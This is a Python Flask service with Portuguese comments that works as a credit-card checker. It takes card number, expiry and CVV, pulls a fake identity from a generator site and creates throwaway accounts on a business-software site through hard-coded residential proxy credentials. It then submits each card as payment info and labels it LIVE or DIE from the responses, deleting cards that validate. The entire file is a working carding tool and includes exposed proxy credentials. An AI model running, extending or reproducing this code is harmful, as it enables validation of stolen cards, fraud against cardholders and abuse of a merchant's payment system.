from flask import Flask, request, jsonify
import requests
import random
from datetime import datetime
import time  # Importando a biblioteca time para usar sleep

app = Flask(__name__)

# Configuração da proxy
PROXY = {
    "http": "http://241016Wa25x-resi-any:gdAA9FUEN9R1h9h@proxy-jet.io:1010",
    "https": "http://241016Wa25x-resi-BR:gdAA9FUEN9R1h9h@ca.proxy-jet.io:1010"
}

# Lista de domínios de e-mail
EMAIL_DOMAINS = [
    "@gmail.com", "@hotmail.com", "@yahoo.com", "@outlook.com", "@mailto.plus",
    "@live.com", "@hotmail.com.br", "@gmail.com.br"
]

# Função para gerar números aleatórios com zero padding
def random_num(min_val, max_val, zero_pad=True):
    num = random.randint(min_val, max_val)
    return f"{num:02d}" if zero_pad else str(num)

# Função para extrair valores entre delimitadores (Left-Right parsing)
def parse_lr(text, left, right):
    start = text.find(left) + len(left)
    end = text.find(right, start)
    return text[start:end]

# Função para gerar e-mail único
def generate_email(name):
    # Remove espaços e caracteres especiais do nome
    name_cleaned = "".join(e for e in name if e.isalnum()).lower()

    # Gera números aleatórios para o e-mail
    random_numbers = random_num(1, 99, True)

    # Escolhe um domínio aleatório da lista
    domain = random.choice(EMAIL_DOMAINS)

    # Combina nome, números e domínio para criar o e-mail
    email = f"{name_cleaned}{random_numbers}{domain}"
    return email

@app.route("/check", methods=["GET"])
def check():
    try:
        # Obter parâmetros da URL no formato info=numero|mes|ano|cvv
        info = request.args.get("info")
        if not info:
            return jsonify({"status": "ERROR", "message": "Parâmetro 'info' não fornecido."}), 400

        # Dividir os valores
        info_parts = info.split("|")
        if len(info_parts) != 4:
            return jsonify({"status": "ERROR", "message": "Formato inválido. Use info=numero|mes|ano|cvv."}), 400

        card_number, exp_month, exp_year, cvc = info_parts

        # Tratar o ano de expiração (garantir que tenha 2 dígitos)
        if len(exp_year) == 4:  # Se o ano tiver 4 dígitos, pegar os 2 últimos
            exp_year = exp_year[-2:]

        # Gerar NN (número aleatório com zero padding)
        NN = random_num(1, 3, True)
        NN1 = random_num(1, 30, True)

        # Função para criar usuário e fazer login
        def create_user_and_login():
            # Primeira requisição POST para gerar dados de pessoa
            url1 = "https://www.4devs.com.br/ferramentas_online.php"
            headers1 = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "pt-BR,pt;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.4devs.com.br",
                "priority": "u=1, i",
                "referer": "https://www.4devs.com.br/gerador_de_pessoas",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"
            }
            data1 = "acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade="

            response1 = requests.post(url1, headers=headers1, data=data1, proxies=PROXY)
            time.sleep(2)  # Sleep de 2 segundos
            source = response1.text

            # Extrair nome completo e primeiro nome
            NAME = parse_lr(source, '[{"nome":"', '"')
            NAME1 = parse_lr(source, '[{"nome":"', ' ')

            # Gerar e-mail único
            EMAILL = generate_email(NAME1)

            # Segunda requisição POST para criar usuário
            url2 = "https://api.business-in-a-box.com/user/"
            headers2 = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "content-type": "application/json",
                "origin": "https://account.business-in-a-box.com",
                "priority": "u=1, i",
                "referer": "https://account.business-in-a-box.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"
            }
            data2 = {
                "FirstName": NAME,
                "LastName": "Silva",
                "Email": EMAILL,
                "Password": f"{NN1}35{NN1}5K7",
                "Language": "en",
                "Country": "Brazil",
                "Device": "Desktop",
                "IpAddress": f"1{NN1}.{NN1}.1{NN1}.{NN1}",
                "SourceChannel": None,
                "SourceCampaign": None,
                "SourceAccount": None,
                "SourceAdGroup": None,
                "SourceKeyword": None,
                "SourceQParam": None,
                "DocName": None,
                "CreationPage": "https://account.business-in-a-box.com/create-account",
                "CustomTracking": None,
                "SourceGuid": f"GA1.1.174{NN1}30{NN1}4.1741{NN1}0773"
            }

            response2 = requests.post(url2, headers=headers2, json=data2, proxies=PROXY)
            time.sleep(2)  # Sleep de 2 segundos

            # Verificar se o usuário foi criado com sucesso
            if "user not found" in response2.text:
                return None, None, None, None

            # Extrair ID e TOKEN da resposta
            ID = parse_lr(response2.text, 'BusinessId":"', '"')
            TOKEN = parse_lr(response2.text, 'ssojwt":"', '"')

            # Terceira requisição POST para login
            url3 = "https://api.business-in-a-box.com/auth/login"
            headers3 = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "authorization": "Bearer undefined",
                "content-type": "application/json",
                "origin": "https://account.business-in-a-box.com",
                "priority": "u=1, i",
                "referer": "https://account.business-in-a-box.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
            }
            data3 = {
                "Email": EMAILL,
                "Password": f"{NN1}35{NN1}5K7"
            }

            response3 = requests.post(url3, headers=headers3, json=data3, proxies=PROXY)
            time.sleep(2)  # Sleep de 2 segundos

            # Verificar se o login foi bem-sucedido
            if "jwt" not in response3.text:
                return None, None, None, None

            return ID, TOKEN, EMAILL, NAME

        # Função para tentar o pagamento
        def try_payment(ID, TOKEN, NAME):
            # Quarta requisição PUT para adicionar informações de pagamento
            url4 = "https://account-api.business-in-a-box.com/v1/business/paymentInfo?verify=true"
            headers4 = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "authorization": f"Bearer {TOKEN}",
                "client_time": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                "content-type": "application/json",
                "origin": "https://account.business-in-a-box.com",
                "priority": "u=1, i",
                "referer": "https://account.business-in-a-box.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"
            }
            data4 = {
                "CardType": 1,
                "CardNumber": card_number,
                "ExpMonth": exp_month,
                "ExpYear": exp_year,  # Usando o ano já tratado
                "NameOnCard": f"{NAME} ",
                "CVC": cvc,
                "BusinessId": ID
            }

            response4 = requests.put(url4, headers=headers4, json=data4, proxies=PROXY)
            time.sleep(2)  # Sleep de 2 segundos

            return response4

        # Tentar criar usuário e fazer login até 3 vezes
        for attempt in range(3):  # 0, 1, 2
            ID, TOKEN, EMAILL, NAME = create_user_and_login()
            if ID and TOKEN and EMAILL and NAME:
                break
            if attempt == 2:
                return jsonify({"status": "ERROR", "message": "Falha ao criar usuário ou fazer login após 3 tentativas."}), 400

        # Tentar o pagamento até 2 vezes em caso de erro específico
        for payment_attempt in range(2):  # 0, 1
            response4 = try_payment(ID, TOKEN, NAME)

            # Verificar o resultado da requisição de pagamento
            if "sso token invalid, expired, or revoked" in response4.text:
                if payment_attempt == 1:  # Se for a segunda tentativa e ainda der erro
                    # Refazer o login e tentar novamente
                    ID, TOKEN, EMAILL, NAME = create_user_and_login()
                    if not ID or not TOKEN or not EMAILL or not NAME:
                        return jsonify({"status": "ERROR", "message": "Falha ao renovar o token SSO."}), 400
                    response4 = try_payment(ID, TOKEN, NAME)  # Tentar o pagamento novamente
                else:
                    continue  # Tenta novamente
            elif "Expired Card" in response4.text:
                return jsonify({"status": "DIE", "message": "Cartão expirado.", "response": response4.text}), 400
            elif "Your card number is incorrect." in response4.text:
                return jsonify({"status": "DIE", "message": "Número do cartão incorreto.", "response": response4.text}), 400
            elif "Card verification failure" in response4.text:
                return jsonify({"status": "DIE", "message": "Falha na verificação do cartão.", "response": response4.text}), 400
            elif "Your card was declined." in response4.text:
                return jsonify({"status": "DIE", "message": "Cartão recusado.", "response": response4.text}), 400
            elif "Your card's security code is incorrect." in response4.text:
                return jsonify({"status": "DIE", "message": "Código de segurança incorreto. POSSIVEL GG.", "response": response4.text}), 200
            elif "Your card has insufficient funds." in response4.text:
                return jsonify({"status": "DIE", "message": "Cartão sem saldo suficiente.", "response": response4.text}), 200
            elif "result\":\"success" in response4.text or "updatePaymentInfo\":\"success" in response4.text:
                # Quinta requisição DELETE para remover o cartão
                url5 = f"https://api.business-in-a-box.com/business/{ID}/payment"
                headers5 = {
                    "accept": "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "authorization": f"Bearer {TOKEN}",
                    "client_time": datetime.now().strftime("%Y-%m-%d"),
                    "origin": "https://account.business-in-a-box.com",
                    "priority": "u=1, i",
                    "referer": "https://account.business-in-a-box.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"
                }

                response5 = requests.delete(url5, headers=headers5, proxies=PROXY)
                time.sleep(2)  # Sleep de 2 segundos

                # Verificar se o cartão foi removido com sucesso
                if response5.text == "{}":
                    return jsonify({"status": "LIVE", "message": "Pagamento processado e cartão removido.", "response": response5.text}), 200
                else:
                    return jsonify({"status": "LIVE", "message": "Pagamento processado, mas falha ao remover o cartão.", "response": response5.text}), 400

        # Caso nenhuma das condições acima seja atendida
        return jsonify({"status": "ERROR", "message": "Resposta inesperada do servidor.", "response": response4.text}), 400

    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000)